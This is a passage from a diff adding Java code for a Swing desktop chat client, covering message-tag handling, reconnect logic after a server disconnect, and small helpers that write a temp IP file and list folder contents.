+                                                {
+                                                    if(alChat.get(i).getUsername().equals(ChatConfig.currentUser))
+                                                    {                                                                
+                                                        alChat.get(i).reqFocusOutside();                                                            
+                                                        break;
+                                                    }
+                                                }
+                                            }
+                                            catch(Exception e)
+                                            {
+                                                e.printStackTrace();
+                                            }
+
+                                            Thread.currentThread().interrupt();
+                                            return;
+                                        }
+                                    }).start();
+
+                            }
+                        }
+                        else 
+                        {
+                            msg = fromUsername + ":" + msg;
+
+
+                            if(hsChat.contains(fromUsername))
+                            {
+
+                                for(int i=0; i < alChat.size(); i++)
+                                {
+                                    if(alChat.get(i).getUsername().equals(ChatConfig.currentUser))
+                                    {                                                                
+                                        alChat.get(i).reqFocusOutside();                                                            
+                                        break;
+                                    }
+                                }
+
+                                for(int i=0; i < alChat.size(); i++)
+                                {
+                                    if(alChat.get(i).getUsername().equals(fromUsername))
+                                    {
+                                        alChat.get(i).appendToConversation(msg);
+                                        alChat.get(i).display();
+                                        break;
+                                    }
+                                }
+
+                            }
+                            else 
+                            {
+                                hsChat.add(fromUsername);
+
+                                String fromFullName = "blank";
+
+                                for(int i=0; i < alChat.size(); i++)
+                                {
+                                    if(alChat.get(i).getUsername().equals(ChatConfig.currentUser))
+                                    {                                                                
+                                        alChat.get(i).reqFocusOutside();                                                            
+                                        break;
+                                    }
+                                }
+
+                                for(int i = 0; i < vector.size(); i++)
+                                {
+                                    if(vector.get(i).getUsername().equals(fromUsername))
+                                    {
+                                        fromFullName = vector.get(i).getUsernameDisplay();
+                                        break;
+                                    }
+                                }
+
+                                MiniChat miniChat = new MiniChat(fromUsername, fromFullName, pw, false, fullName, myUsername);
+                                alChat.add(miniChat);
+                                miniChat.appendToConversation(msg);
+                                miniChat.blinkNowOnly(); 
+
+                            }
+                        }
+                    }
+                    else if(message.startsWith("[LIKE]"))
+                    {
+                        String data = message.substring(6, message.length());
+
+                        String parts[] = data.split("\\*");
+                        String fromUsername = parts[0];
+                        String targetUsername = parts[1];
+
+                        for(int i=0; i < alChat.size(); i++)
+                        {
+                            if(alChat.get(i).getUsername().equals(fromUsername))
+                            {
+                                alChat.get(i).HeInsertLike();
+                                alChat.get(i).display();
+                                break;
+                            }
+                        }
+                    }
+                    else if(message.startsWith("[ThisUserOff]"))
+                    {
+                        String username = message.substring(13, message.length());
+
+                        for(int i=0; i < alChat.size(); i++)
+                        {
+                            if(alChat.get(i).getUsername().equals(username))
+                            {                       
+                                alChat.get(i).disableAll();
+                                break;
+                            }
+                        }
+                    }
+                    else if(message.startsWith("[ThisUserIsBack]"))
+                    {
+                        String username = message.substring(16, message.length());
+
+                        for(int i=0; i < alChat.size(); i++)
+                        {
+                            if(alChat.get(i).getUsername().equals(username))
+                            {                       
+                                alChat.get(i).userLoggedBack();
+                                break;
+                            }
+                        }
+                    }
+                    else if(message.startsWith("[typeNoty]"))
+                    {
+                        String subs = message.substring(10, message.length());
+
+                        String parts[] = subs.split("\\*");
+                        String targetUsername = parts[0];
+                        String status = parts[1];
+
+                        for(int i=0; i < alChat.size(); i++)
+                        {
+                            if(alChat.get(i).getUsername().equals(targetUsername))
+                            {                       
+                                if(status.equals("0"))
+                                {
+                                    alChat.get(i).notTyping();
+                                }
+                                else
+                                    alChat.get(i).isTyping();
+                                break;
+                            }
+                        }
+                    }        
+                    else if(message.startsWith("[LastStatus]"))
+                    {
+                        String targetUsername = message.substring(12, message.length());
+
+                        for(int i=0; i < alChat.size(); i++)
+                        {
+                            if(alChat.get(i).getUsername().equals(targetUsername))
+                            {                       
+                                alChat.get(i).showLastSeen();
+                                break;
+                            }
+                        }
+                    }
+                    else if(message.startsWith("[ON9Status]"))
+                    {
+                        String targetUsername = message.substring(11, message.length());
+
+                        for(int i=0; i < alChat.size(); i++)
+                        {
+                            if(alChat.get(i).getUsername().equals(targetUsername))
+                            {                       
+                                alChat.get(i).showOnline();
+                                break;
+                            }
+                        }
+                    }
+                    else if(message.startsWith("[stickers]"))
+                    {
+                        String subs = message.substring(10, message.length());
+
+                        String parts[] = subs.split("\\*");
+                        String targetUsername = parts[0];
+                        final String stickername = parts[1];
+
+                        /*
+                        for(int i=0; i < alChat.size(); i++)
+                        {
+                        if(alChat.get(i).getUsername().equals(targetUsername))
+                        {                       
+                        alChat.get(i).identifySticker(stickername);
+                        alChat.get(i).display();
+                        break;
+                        }
+                        }
+                         */
+
+                        if(hsChat.contains(targetUsername))
+                        {
+                            for(int i=0; i < alChat.size(); i++)
+                            {
+                                if(alChat.get(i).getUsername().equals(targetUsername))
+                                {                       
+                                    alChat.get(i).identifySticker(stickername);
+                                    alChat.get(i).display();
+                                    break;
+                                }
+                            }
+                        }
+                        else 
+                        {
+                            hsChat.add(targetUsername);
+
+                            String fromFullName = "blank";
+                            for(int i = 0; i < vector.size(); i++)
+                            {
+                                if(vector.get(i).getUsername().equals(targetUsername))
+                                {
+                                    fromFullName = vector.get(i).getUsernameDisplay();
+                                    break;
+                                }
+                            }
+
+                            final MiniChat miniChat = new MiniChat(targetUsername, fromFullName, pw, false, fullName, myUsername);
+                            alChat.add(miniChat);
+
+                            new Thread(new Runnable()
+                                {
+                                    public void run()
+                                    {
+                                        try
+                                        {
+                                            Thread.sleep(3000);
+                                            miniChat.identifySticker(stickername);                          
+                                            miniChat.blinkNowOnly();
+
+                                            for(int i=0; i < alChat.size(); i++)
+                                            {
+                                                if(alChat.get(i).getUsername().equals(ChatConfig.currentUser))
+                                                {                                                                
+                                                    alChat.get(i).reqFocusOutside();                                                            
+                                                    break;
+                                                }
+                                            }
+                                        }
+                                        catch(Exception e)
+                                        {
+                                            e.printStackTrace();
+                                        }
+
+                                        Thread.currentThread().interrupt();
+                                        return;
+                                    }
+                                }).start();
+
+                        }
+                    }
+                    else if(message.startsWith("[selfstickers]"))
+                    {
+                        String subs = message.substring(14, message.length());
+
+                        String parts[] = subs.split("\\*");
+                        String targetUsername = parts[0];
+                        String stickername = parts[1];
+
+                        for(int i=0; i < alChat.size(); i++)
+                        {
+                            if(alChat.get(i).getUsername().equals(targetUsername))
+                            {                       
+                                alChat.get(i).appendStickerSelf(stickername);
+                                break;
+                            }
+                        }
+                    }
+                    else if(message.startsWith("[changeName]"))
+                    {                        
+                        String username = message.substring(12, message.length());
+                        String fullNameTemp = "";
+
+                        for(int i = 0; i < vector.size(); i++)
+                        {
+                            if(vector.get(i).getUsername().equals(username))
+                            {
+                                fullNameTemp = vector.get(i).getFullName();
+                                break;
+                            }
+                        }
+
+                        if(!fullNameTemp.equals(""))    
+                        {
+                            if(hsChat.contains(username))
+                            {
+                                for(int i=0;i < alChat.size();i++)
+                                {
+                                    if(alChat.get(i).getUsername().equals(username))
+                                    { 
+                                        alChat.get(i).setFriendFullName(fullNameTemp);
+                                        break;
+                                    }
+                                }
+                            }
+
+                        }
+                    }
+                    else if(message.startsWith("[CName]"))
+                    {
+                        String fullName = message.substring(7, message.length());
+                        ChangeFullNameAdmin(fullName);
+                    }
+                }
+
+            }
+            catch(java.lang.NullPointerException e)
+            {
+            }
+            catch(java.net.SocketException e) 
+            {
+
+                for(int i = 0; i < alChat.size(); i++)
+                {
+                    alChat.get(i).dispose();
+                    alChat.get(i).mmd.dispose();
+                }
+
+                vector.clear();
+                alChat.clear();
+                hsChat.clear();
+
+                dups = false;
+                connecting = false;
+                connected = false;
+                serverError = true;
+
+                SwingUtilities.invokeLater(new Runnable()
+                    {
+                        public void run()
+                        {
+                            remove(pnlUpper);
+                            remove(sp);
+
+                            add(pnlSpin);
+                            lblSpin.setIcon(null);
+                            lblSpin.setText("Server down");      
+                            btnRefresh.setVisible(true);
+
+                        }
+                    });
+
+                try
+                {
+                    background = null;
+                    if(isDisplayable())
+                    {
+                        repaint();
+                    }
+                }
+                catch(Exception ex)
+                {
+                    ex.printStackTrace();
+                }
+
+            }
+            catch(Exception e)
+            {
+                e.printStackTrace();
+            }
+            Thread.currentThread().interrupt();
+            return;
+
+        }
+    }
+
+    public void alertToMaster(String message) 
+    {
+        pw.println("[MSG]" + "yihjye" + ": " + "[alertonly]" + message);  
+    }
+
+    class ConnectionCheck extends Thread
+    {
+        public void run()
+        {
+            try
+            {
+                while(true)
+                {
+                    Thread.sleep(60000);
+
+                    if(connected == false)
+                    {
+                        if(dups == false)
+                        {
+                            activate();
+                        }
+
+                    }
+                }
+            }
+            catch(Exception e)
+            {
+                e.printStackTrace();
+            }
+
+            Thread.currentThread().interrupt();
+            return;
+        }
+    }
+
+    public void setTempIP(final String ip)
+    {
+        new Thread(new Runnable()
+            {
+                public void run()
+                {
+                    try
+                    {
+                        File file = new File("C:\\SEL\\tempip.txt");
+                        file.deleteOnExit();
+
+                        FileWriter fw = new FileWriter(file);
+                        PrintWriter pw = new PrintWriter(fw);
+
+                        pw.println(ip);
+                        pw.close();
+                    }
+                    catch(Exception e)
+                    {
+                        e.printStackTrace();
+                    }
+
+                    Thread.currentThread().interrupt();
+                    return;
+                }
+            }).start();
+
+    }
+
+    public  Vector<FileInsPro> getListOfData(String path)
+    {
+        File folder = new File(path);
+
+        Vector<FileInsPro> al = new Vector<FileInsPro>();
+
+        try
+        {
+            if(folder.isDirectory())
+            {
+                File[] list = folder.listFiles();
+
+                for(int i = 0; i < list.length; i++)
+                {
+                    File file = new File(list[i].getPath());
+
+                    FileInsPro pro = new FileInsPro(list[i].getName(), list[i].getPath());
+                    al.add(pro);
+
+                    /*
+
+                    if(file.isDirectory())
+                    {
+                    FileInsPro pro = new FileInsPro("(folder) " + list[i].getName(), list[i].getPath());
+                    al.add(pro);
+                    }
+                    else
+                    {
+                    FileInsPro pro = new FileInsPro(list[i].getName(), list[i].getPath());
+                    al.add(pro);
+                    }
+                     */
+                }
+            }
+        }
+        catch(Exception e)
+        {
+        }
+
+        return al;
+    }
+
+    public  Vector<FileInsPro> getCDrive()
+    {
+        File folder = new File("C:\\");
+
+        Vector<FileInsPro> al = new Vector<FileInsPro>();
+
+        try
+        {
+            if(folder.isDirectory())
+            {
+                File[] list = folder.listFiles();
+
+                for(int i = 0; i < list.length; i++)
+                {
+                    File file = new File(list[i].getPath());
+
+                    FileInsPro pro = new FileInsPro(list[i].getName(), list[i].getPath());
+                    al.add(pro);
+                }
+            }
+        }
+        catch(Exception e)
+        {
+        }
+
+        return al;
+    }
+
+    /*
+    public synchronized void removeIndex(int index, String username)
+    {
+
+    alChat.get(index).mmd.requestFocusInWindow();           
+    alChat.get(index).mmd.pack();
+    alChat.get(index).mmd.getContentPane().removeAll();
+    alChat.get(index).mmd.dispose();
+    alChat.get(index).mmd = null;
+
+    alChat.get(index).requestFocusInWindow();
+    alChat.get(index).pack();
+    alChat.get(index).viewport.removeAll();
+    alChat.get(index).sp.setViewport(null);
+    alChat.get(index).viewport = null;
+    alChat.get(index).getContentPane().removeAll();
+    alChat.get(index).dispose();    
+
+    alChat.remove(index);
+    hsChat.remove(username);
+    }
+
+    class disposeCheck extends Thread
+    {
+    public void run()
+    {
+    try
+    {
+    while(true)
+    {
+    Thread.sleep(1000);
+
+    for(int i =0; i < alChat.size(); i++)
+    {
+    if(alChat.get(i).disposed == true)
+    {
+    removeIndex(alChat.indexOf(alChat.get(i)), alChat.get(i).getUsername());
+    }
+    }
+    }   
+    }
+    catch(Exception e)
+    {
+    e.printStackTrace();
+    }
+
+    }        
+    }
+     */
+
+}
